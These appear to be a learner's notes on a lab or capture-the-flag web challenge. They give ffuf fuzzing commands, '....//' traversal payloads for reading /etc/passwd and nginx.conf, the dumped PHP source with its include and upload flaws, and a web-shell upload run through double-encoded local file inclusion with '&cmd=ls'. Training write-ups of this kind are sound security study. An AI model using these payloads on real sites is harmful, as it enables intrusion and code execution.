- Subdomain enumeration
	- Found `...index.php`, `contact.php`, `apply.php`, `thanks.php` with subdomain fuzzing (these are subdomains only, nothing to do with LFI)
	- `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://94.237.59.242:54930/FUZZ.php'      
- Parameter fuzzing
	- Found nothing for index.php
	- Contact.php: found region
	- eg. `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.59.242:54930/contact.php?FUZZ=value' -fs 1771`
	- Then try to fuzz the region one
		-  `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://94.237.55.124:32401/contact.php?region=FUZZ -fs 1239
		- Got some outputs. We see things like Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA== 
- Look at source code
	- Find `http://94.237.59.242:54930/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c`
	- Try to fuzz this
	- `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.59.242:54930/api/image.php?p=FUZZ' -fs 0
		- Work! Check output in Burp
		- We find `...//....//....//etc/passwd
- There's also an upload form.
	- We want to upload a shell and see where it ends up
	- Firstly, the POST HTTP reply shoes us that it's a nginx server
	- Googling shows us that the nginx config fils it /etc/nginx/nginx.conf
	- `http://94.237.55.124:32401/api/image.php?p=....//....//....//....//etc/nginx/nginx.conf

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
#
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
```

We find the location of the `access.log`.
- Tried server log poisoning with access.log (ie. changing user agent to the shell then LFI the access log), but it's not running the PHP so it doesnt work.

New idea, read the individual php files
- Got this from a hint, take note!! very useful
- ie. Get the **source code of the APIs** to see what they are doing.
- In Burp,
`http://94.237.55.124:32401/api/image.php?p=....//api/image.php
```
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>
```
`http://94.237.55.124:32401/api/image.php?p=....///api/image.php?p=....//api/application.php
```
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```
- Read tjos carefully! It now tells us where our uploads are, amd that the filename is the md5 hash of the file
	- fc023fcacb27a7ad72d605c4e300b389


`http://94.237.55.124:32401/api/image.php?p=....///api/image.php?p=....//api/contact.php
```

<html>
    <head>
        <title>&lt;sumace/></title>
        <link rel="stylesheet" href="https://unpkg.com/mvp.css">
        <link rel="stylesheet" href="/css/custom.css">
    </head>
    <body>
        <header>
            <nav>
                <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/></a>
                <ul>
                    <li><a href="/">Home</a></li>
                    <li>Contact</li>
                    <li><a href="/apply.php">Apply</a></li>
                </ul>
            </nav>  
            <section>
                <header>
                    <h1>Contact us.</h1>
                    <p>Give us a call. <mark>We will sort it out</mark>.</p>
                </header>
                <p>
                    <?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
                </p>
            </section>
        </header>
        <footer>
            <hr>
            <p>
                <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25"/></a><br>
                Sumace Consulting Gmbh<br>
                Rasumofskygasse 23/25, 1030 Wien<br>
                +43 670 8872 958<br>
            </p>
        </footer>
    </body>
</html>
```

- Again we see the ./regions/ thing
	- Read the code!
	- User input into include()
	- Vulnerable

- We also know where the upload file is, so upload a web shell, compute the hash and LFI it
	- `http://94.237.55.124:32401/api/image.php?p=....//uploads/fc023fcacb27a7ad72d605c4e300b389
		- no execution here, but the region one has execution
	- Region LFI
		- decodes ONCE
		- We can see this from the code we pulled
		- So just double encode it
		- ie. double encode ../uploads/fc023fcacb27a7ad72d605c4e300b389
		- Then take that and append `&cmd=ls` at the end of it
		- Then run `http://94.237.61.52:48120/contact.php?region=<encoded stuff>&cmd=ls

